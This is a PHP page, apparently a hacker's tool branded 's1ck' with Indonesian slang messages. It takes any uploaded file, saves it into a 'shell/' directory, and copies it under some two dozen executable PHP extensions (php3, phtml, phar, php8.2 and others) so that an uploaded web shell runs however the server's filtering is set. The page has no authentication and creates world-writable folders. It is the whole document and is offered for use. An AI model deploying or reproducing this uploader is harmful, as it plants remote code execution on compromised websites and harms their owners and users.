<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

$uploadSuccess = false;
$uploadError = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $allowedExts = [
        'php', 'php2', 'php3', 'php4', 'php5', 'php6', 'php7', 'php8', 'php9',
        'pht', 'phtml', 'phps', 'phar', 'inc', 'tpl', 'cgi',
        'php-s', 'php7.0', 'php7.1', 'php7.2', 'php7.3', 'php7.4', 'php8.0', 'php8.1', 'php8.2'
    ];

    $uploadDir = __DIR__ . "/shell/";
    $filename = basename($_FILES['file']['name']);
    $nameOnly = pathinfo($filename, PATHINFO_FILENAME);
    $extOriginal = strtolower(pathinfo($filename, PATHINFO_EXTENSION) ?? '');

    if (!$extOriginal) {
        $uploadError = "ekstensinya mana memekk !";
    } else {
        $tmpPath = $_FILES['file']['tmp_name'];
        $targetFolder = $uploadDir . $nameOnly . "/";
        if (!is_dir($targetFolder)) {
            mkdir($targetFolder, 0777, true);
        }

        $original = $targetFolder . $filename;
        if (move_uploaded_file($tmpPath, $original)) {
            $allSuccess = true;
            foreach ($allowedExts as $ext) {
                if ($ext === $extOriginal) continue;
                $newPath = $targetFolder . $nameOnly . '.' . $ext;
                if (!copy($original, $newPath)) {
                    $uploadError .= "wlee gagal: $newPath\n";
                    $allSuccess = false;
                }
            }
            $uploadSuccess = $allSuccess;
        } else {
            $uploadError = "original file mu gagal ke save awakowakowk.";
        }
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>olaa world</title>
    <style>
    body {
        text-align: center;
        background-color: #000;
        color: #fff;
        font-family: Arial, sans-serif;
    }
    img {
        margin-top: 20px;
        width: 300px;
        border-radius: 0;
        box-shadow: 0 0 0px #333;
    }
    button {
        margin: 15px auto;
        padding: 8px 13px;
        font-size: 14px;
        background-color:rgb(255, 61, 61);
        border: none;
        border-radius: 6px;
        color: #fff;
        cursor: pointer;
        display: block;
    }
    button:hover {
        background-color:rgb(180, 58, 58);
    }
    button#startButton {
        margin-top: 42px; 
    }
    .caption {
        font-size: 24px;
        margin-top: 40px;
    }
    #uploadForm {
        display: none;
        opacity: 0;
        transition: opacity 0.5s ease;
        margin-top: 30px;
        margin-bottom: 15px;
    }
    #uploadForm.show {
        display: block;
        opacity: 1;
    }
    .instagram-link {
        margin-top: 15px;
        display: inline-block;
    }
    .instagram-link img {
        width: 40px;
        height: 30px;
        vertical-align: middle;
        margin-right: 8px;
        margin-top: 0;
    }
    .instagram-link a {
        color: white;
        text-decoration: none;
        font-weight: bold;
        vertical-align: middle;
    }
    .instagram-link a:hover {
        text-decoration: underline;
    }
</style>
    <script>
        function showUpload() {
            const form = document.getElementById("uploadForm");
            const btn = document.getElementById("startButton");
            form.classList.add("show");
            btn.style.display = "none"; 
        }
    </script>
</head>
<body>
    <div class="caption">s1ck</div>
    <img src="https://i.ibb.co.com/HDzCL7Y3/87639-C6-D-20-D9-4-F05-904-D-581711291-D85.png" alt="Image">
    
    <button id="startButton" onclick="showUpload()">upload ur file</button>

    <form id="uploadForm" method="post" enctype="multipart/form-data">
        <input type="file" name="file" required>
        <button type="submit">Upload</button>
    </form>

    <div class="instagram-link">
    <a href="https://www.instagram.com/huseinpb.s1ck" target="_blank">
        <img src="https://cdn.freebiesupply.com/images/large/2x/instagram-icon-white-on-black.png" alt="Instagram Logo">
    </a>
</div>

    <?php if ($uploadSuccess): ?>
        <div style="margin-top: 20px; color: white; font-weight: normal;">
            saved on folder (<?= htmlspecialchars($nameOnly) ?>)
        </div>
    <?php elseif (!empty($uploadError)): ?>
        <script>alert("salah jir wkwk :\n<?= addslashes($uploadError) ?>");</script>
    <?php endif; ?>
</body>
</html>
